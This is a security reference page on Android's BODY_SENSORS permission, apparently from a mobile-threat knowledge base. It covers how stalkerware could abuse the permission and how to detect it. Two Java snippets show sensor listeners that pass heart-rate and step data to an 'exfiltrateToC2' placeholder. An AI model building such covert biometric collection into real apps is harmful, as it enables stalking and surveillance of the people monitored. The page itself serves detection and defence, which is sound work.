# BODY_SENSORS

Allows access to body sensor data from paired health devices: heart rate monitors, fitness trackers, and other biometric sensors.

## Technical Details

| Attribute | Value |
|-----------|-------|
| Permission | `android.permission.BODY_SENSORS` |
| Protection Level | `dangerous` |
| Permission Group | `SENSORS` |
| Grant Method | Runtime permission dialog |
| Introduced | API 20 (Android 4.4W) |

## What It Enables

Access to `SensorManager` for body sensor types:

| Sensor Type | Data |
|-------------|------|
| `TYPE_HEART_RATE` | Heart rate in BPM |
| `TYPE_STEP_COUNTER` | Cumulative step count since last reboot |
| `TYPE_STEP_DETECTOR` | Step detection events |

Also enables reading health data from paired Wear OS devices and Bluetooth health devices.

## Abuse in Malware

No major Android malware families are known to specifically request or abuse `BODY_SENSORS`. The attack surface is small compared to other permission groups because sensor data has limited direct value for financial fraud or credential theft, the primary motivations of most mobile malware.

### Stalkerware and Surveillance

Stalkerware is the most plausible threat category for body sensor abuse. Apps designed to monitor a partner or target could collect heart rate and step data to build a detailed profile of the victim's daily routine. While no documented stalkerware families (including [BoneSpy](../../malware/families/bonespy.md), [KoSpy](../../malware/families/kospy.md), or [PlainGnome](../../malware/families/plaingnome.md)) currently collect body sensor data, the capability requires minimal code:

```java
SensorManager sensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
Sensor heartRate = sensorManager.getDefaultSensor(Sensor.TYPE_HEART_RATE);
sensorManager.registerListener(new SensorEventListener() {
    @Override
    public void onSensorChanged(SensorEvent event) {
        float bpm = event.values[0];
        long timestamp = event.timestamp;
        exfiltrateToC2(bpm, timestamp);
    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {
    }
}, heartRate, SensorManager.SENSOR_DELAY_NORMAL);
```

### Health Data Theft

Biometric data has value for blackmail, insurance fraud, or intelligence profiling. Heart rate data can reveal:

- Stress patterns (elevated resting heart rate during specific meetings or locations)
- Sleep schedule (low heart rate extended periods)
- Exercise routines and physical fitness level
- Medical conditions (arrhythmia, tachycardia)

### Activity Inference via Step Counter

Step counter data is particularly useful for behavioral profiling because `TYPE_STEP_COUNTER` provides a cumulative count since last reboot, meaning a single reading reveals the total activity level:

```java
Sensor stepCounter = sensorManager.getDefaultSensor(Sensor.TYPE_STEP_COUNTER);
sensorManager.registerListener(new SensorEventListener() {
    @Override
    public void onSensorChanged(SensorEvent event) {
        float totalSteps = event.values[0];
        exfiltrateToC2(totalSteps, System.currentTimeMillis());
    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {
    }
}, stepCounter, SensorManager.SENSOR_DELAY_NORMAL);
```

Periodic readings reveal when the target is moving, stationary, or sleeping.

## Android Version Changes

**Android 4.4W (API 20)**: `BODY_SENSORS` introduced with Android Wear, initially targeting wearable devices with built-in heart rate sensors.

**Android 6.0 (API 23)**: became a runtime permission. Apps must request `BODY_SENSORS` at runtime before accessing heart rate or step sensors.

**Android 13 (API 33)**: `BODY_SENSORS_BACKGROUND` introduced as a separate permission (see [BODY_SENSORS_BACKGROUND](body-sensors-background.md)). Foreground-only sensor access requires only `BODY_SENSORS`, but continuous background monitoring requires the additional background permission. This mirrors the foreground/background split applied to location in Android 10.

**Android 14 (API 34)**: Health Connect API introduced as the recommended way to access health and fitness data, consolidating data from multiple sensor sources. `BODY_SENSORS` remains valid for direct sensor access but Health Connect is preferred for cross-app health data sharing.

## Detection

In the manifest:

```xml
<uses-permission android:name="android.permission.BODY_SENSORS" />
```

Only expected in fitness, health, and wearable companion apps.

### Static Analysis Indicators

- `SensorManager.getDefaultSensor(Sensor.TYPE_HEART_RATE)` or `TYPE_STEP_COUNTER`
- `SensorEventListener` implementations that transmit sensor values over the network
- Registration for sensor events with `SENSOR_DELAY_FASTEST` (indicates data harvesting rather than user-facing display)

### Dynamic Analysis Indicators

- App registers for body sensor events without displaying any health-related UI
- Sensor data appearing in network traffic payloads
- Continuous sensor registration that persists when the app is backgrounded (requires [BODY_SENSORS_BACKGROUND](body-sensors-background.md) on Android 13+)

### Permission Combination Red Flags

`BODY_SENSORS` combined with `INTERNET`, [ACCESS_FINE_LOCATION](../location/access-fine-location.md), and [RECORD_AUDIO](../microphone/record-audio.md) in a non-fitness app is a strong indicator of comprehensive surveillance. When combined with [BODY_SENSORS_BACKGROUND](body-sensors-background.md), the app can perform 24/7 biometric monitoring.
